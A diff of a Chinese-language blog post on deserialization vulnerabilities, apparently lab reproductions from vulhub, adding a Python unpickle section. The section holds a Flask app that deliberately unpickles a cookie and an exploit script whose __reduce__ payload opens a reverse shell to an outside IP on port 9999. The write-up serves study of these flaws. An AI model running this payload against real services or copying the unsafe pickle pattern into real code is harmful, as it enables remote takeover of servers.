@@ -24,7 +24,8 @@
 <meta property="og:image" content="https://img.5am3.com/images/20190401/UFbdeULMauuU.png?imageslim">
 <meta property="og:image" content="https://img.5am3.com/images/20190401/yqlrgvWY6f0k.png?imageslim">
 <meta property="og:image" content="https://img.5am3.com/images/20190401/g6hzUL9tQirc.png?imageslim">
-<meta property="og:updated_time" content="2019-04-01T10:42:18.569Z">
+<meta property="og:image" content="https://img.5am3.com/images/20190401/k4YWFXnU6EMY.png?imageslim">
+<meta property="og:updated_time" content="2019-04-01T11:36:45.928Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="通过实例学习反序列化">
 <meta name="twitter:description" content="复现vulhub以及总结">
@@ -218,6 +219,13 @@
 <h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><h3 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h3><p>参考链接：<a href="https://vulhub.org/#/environments/jboss/CVE-2017-12149/" target="_blank" rel="noopener">JBoss反序列化</a></p>
 <h3 id="fastjson-反序列化导致任意命令执行漏洞"><a href="#fastjson-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 反序列化导致任意命令执行漏洞"></a>fastjson 反序列化导致任意命令执行漏洞</h3><p>参考链接：<a href="https://vulhub.org/#/environments/fastjson/vuln/" target="_blank" rel="noopener">fastjso反序列化n</a></p>
 <h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h3 id="Python-unpickle-造成任意命令执行漏洞"><a href="#Python-unpickle-造成任意命令执行漏洞" class="headerlink" title="Python unpickle 造成任意命令执行漏洞"></a>Python unpickle 造成任意命令执行漏洞</h3><p>参考链接：<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" target="_blank" rel="noopener">某站Python漏洞挖掘</a></p>
+<p>web端源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">'user'</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        username = user[<span class="string">"username"</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">"Guest"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello %s"</span> % username</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://your-ip:8000</code>，显示<code>Hello {username}!</code>。username是取Cookie变量user，对其进行base64解码+反序列化后还原的对象中的“username”变量，默认为“Guest”，伪代码：<code>pickle_decode(base64_decode(cookie[&#39;user&#39;]))[&#39;username&#39;] or &#39;Guest&#39;</code></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.94.129.246",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">"http://192.168.242.131:8000/"</span>, cookies=dict(</span><br><span class="line">    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line"><span class="keyword">print</span> response.content</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.5am3.com/images/20190401/k4YWFXnU6EMY.png?imageslim" alt="mark"></p>
+<p>感觉这个python的反序列化和PHP有点区别是，PHP需要找到哪个函数调用反序列化，输出点在哪里，需要POP链，但是python的如果输入可控，就直接可以传入一个类进行命令执行了。</p>
 
       
 
@@ -465,11 +473,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">知识收藏</a>
+                <a href="javascript:void(0)" class="js-tag color1">web学习</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web学习</a>
+                <a href="javascript:void(0)" class="js-tag color5">知识收藏</a>
               </li>
             
             <div class="clearfix"></div>
